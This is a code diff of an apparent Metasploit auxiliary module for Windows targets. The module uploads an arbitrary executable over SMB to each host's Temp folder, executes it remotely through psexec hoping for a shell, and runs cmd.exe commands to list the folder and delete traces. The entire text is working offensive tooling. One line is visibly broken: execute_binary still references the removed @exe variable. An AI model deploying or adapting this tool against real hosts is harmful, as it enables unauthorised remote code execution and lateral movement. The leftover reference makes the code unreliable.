@@ -44,9 +44,6 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		deregister_options('RHOST')			
-		@exe = "#{Rex::Text.rand_text_alpha(16)}.exe"
-		@cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
-		@text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 	end
 	
 	
@@ -55,10 +52,14 @@ class Metasploit3 < Msf::Auxiliary
 	# Main control method
 	#---------------------
 	def run_host(ip)
+		exe = "#{Rex::Text.rand_text_alpha(16)}.exe"
+		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
+		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		#Try and connect to the target
 		begin
 			connect()
 		rescue StandardError => connecterror
+			print_error("Unable to connect to the target. #{connecterror}")
 			return
 		end
 		
@@ -76,9 +77,9 @@ class Metasploit3 < Msf::Auxiliary
 		# Try and execute the module
 		smbshare = datastore['SMBSHARE']
 		begin
-			upload_binary(smbshare, ip)
-			execute_binary(smbshare, ip)
-			#cleanup_after(smbshare, ip)
+			upload_binary(smbshare, ip, exe, cmd, text)
+			execute_binary(smbshare, ip, exe)
+			cleanup_after(smbshare, ip, cmd, text)
 		rescue StandardError => mainerror
 			print_error("Something went wrong.")
 			print_error("#{mainerror.class}")
@@ -94,10 +95,10 @@ class Metasploit3 < Msf::Auxiliary
 	#--------------------------------------------------------------------------------------
 	# This method will upload the binary executable to the target's WINDOWS\Temp directory	
 	#--------------------------------------------------------------------------------------
-	def upload_binary(smbshare, ip)
+	def upload_binary(smbshare, ip, exe, cmd, text)
 		print_status("Uploading binary to #{ip}.")
 		begin
-			if file_exists(smbshare, ip, @exe)
+			if file_exists(smbshare, ip, exe, cmd, text)
 				print_status("Binary already exists on target, no need to re-upload.")
 				return
 			end
@@ -107,7 +108,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_error("Couldn't mount the share.  Make sure you have local admin.")
 				return
 			end
-			remote = simple.open("\\\\WINDOWS\\Temp\\#{@exe}", 'rwct')
+			remote = simple.open("\\\\WINDOWS\\Temp\\#{exe}", 'rwct')
 			remote.write(data)
 			remote.close
 		rescue StandardError => uploaderror
@@ -124,15 +125,15 @@ class Metasploit3 < Msf::Auxiliary
 	#-----------------------------------------------------
 	# Check the remote host to see if a file exists first
 	#-----------------------------------------------------
-	def file_exists(smbshare, ip, file)
+	def file_exists(smbshare, ip, file, cmd, text)
 		begin
 			# Try and check the filesystem fo rthe target
-			dir = "#{@cmd} /C dir C:\\WINDOWS\\Temp > C:#{@text}"
+			dir = "#{cmd} /C dir C:\\WINDOWS\\Temp > C:#{text}"
 			simple.connect(smbshare)
 			psexec(smbshare, dir)
 			simple.connect("\\\\#{ip}\\#{smbshare}")
-			remote = simple.open("\\#{@text}", 'ro')
-			if remote.read.include?(@exe)
+			remote = simple.open("\\#{text}", 'ro')
+			if remote.read.include?(file)
 				remote.close 
 				simple.disconnect("\\\\#{ip}\\#{smbshare}")
 				return true
@@ -153,16 +154,15 @@ class Metasploit3 < Msf::Auxiliary
 	#----------------------------------------------------------------------------
 	# This method calls the uploaded binary.  Hopefully you'll get some shellz!!
 	#----------------------------------------------------------------------------
-	def execute_binary(smbshare, ip)
-		print_status("Executing #{@exe} on #{ip}.")
+	def execute_binary(smbshare, ip, exe)
+		print_status("Executing #{exe} on #{ip}.")
 		begin
 			# Try and run the binary
-			#command = "#{@cmd} /C start C:\\WINDOWS\\Temp\\#{@exe}"
 			command = "C:\\WINDOWS\\Temp\\#{@exe}"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
 		rescue StandardError => executeerror
-			print_error("Unable to run the binary.  Might have been caught by AV.")
+			print_error("Unable to run the binary on #{ip}.  Might have been caught by AV.")
 			print_error("#{executeerror.class}")
 			print_error("#{executeerror}")
 			return executeerror
@@ -174,10 +174,10 @@ class Metasploit3 < Msf::Auxiliary
 	#----------------------------------------------------------------------------------
 	# This is the cleanup method, removes .txt file/s created during execution
 	#-----------------------------------------------------------------------------------
-	def cleanup_after(smbshare, ip)
+	def cleanup_after(smbshare, ip, cmd, text)
 		begin
 			# Try and do cleanup command
-			cleanup = "#{@cmd} /C del C:#{@text}"
+			cleanup = "#{cmd} /C del C:#{text}"
 			simple.connect(smbshare)
 			print_status("Executing cleanup on host: #{ip}")
 			psexec(smbshare, cleanup)
